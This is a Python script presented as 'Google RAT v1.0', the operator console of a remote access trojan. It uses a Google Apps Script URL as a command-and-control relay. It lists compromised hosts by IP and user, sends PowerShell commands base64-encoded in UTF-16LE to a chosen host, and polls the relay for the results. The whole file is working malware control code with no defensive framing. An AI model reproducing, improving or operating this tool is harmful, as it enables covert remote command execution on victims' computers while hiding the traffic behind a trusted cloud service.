import base64
import logging
import requests
import argparse

LOG_FORMAT = '[%(asctime)s] %(message)s'
BANNER = """
*******************************************************************************
Google RAT v1.0
*******************************************************************************
# view help:
python script.py -h
# connect to server
python script.py https://script.google.com/macros/s/dsfkjlksdfjlksdfjlksdf/exec
*******************************************************************************
"""


if __name__ == '__main__':
  # parse user arguments
  parser = argparse.ArgumentParser(usage=BANNER)
  parser.add_argument('srv', help='google apps server URL', type=str)
  args = parser.parse_args()
  # setup logger
  logging.basicConfig(format=LOG_FORMAT, datefmt='%d %b %Y %H:%M:%S', level=logging.INFO)
  logging.info('connecting to {} ...'.format(args.srv))
  # connect to server and get list of current hosts
  r = requests.get(args.srv, params={'l': ''})
  if r.status_code != requests.codes.ok:
    logging.error('failed to connect to {}'.format(args.srv))
    exit()
  logging.info('server is up! getting list of connected hosts ...')
  hosts = []
  raw = r.content.decode('UTF-8').split('|')
  for ip,user in zip(raw[0::2], raw[1::2]):
    if ip and user:
      hosts.append({'ip': ip, 'user': user})
      logging.info('\t{0}@{1}'.format(user, ip))
  if not hosts:
    logging.info('no hosts found')
    exit()
  # accept user input for hosts
  logging.info('enter "quit" to exit')
  while True:
    ip = input('Enter ip: ')
    if ip == 'quit':
      logging.info('exiting ...')
      quit()
    # drop into shell for IP
    if ip in [d['ip'] for d in hosts]:
      user = [d['user'] for d in hosts if d['ip'] == ip][0]
      logging.info('enter "exit" to exit shell')
      while True:
        cmd = input('{0}@{1} PS> '.format(user, ip))
        if cmd == 'exit':
          logging.info('exiting shell on {0} ...'.format(ip))
          break
        cmdx = base64.b64encode(cmd.encode('UTF-16LE')).decode('UTF-8')
        r = requests.get(args.srv, params={'x': '{0}|{1}|{2}'.format(ip, user, cmdx)})
        if r.status_code != requests.codes.ok:
          logging.info('command execution failed')
          continue
        # loop until result given
        while True:
          r = requests.get(args.srv, params={'r': '{0}|{1}'.format(ip, user)})
          if r.content.decode('UTF-8').startswith('d='):
            print(base64.b64decode(r.content.decode('UTF-8')[2:]).decode('UTF-8'))
            break
    else:
      logging.info('invalid IP')

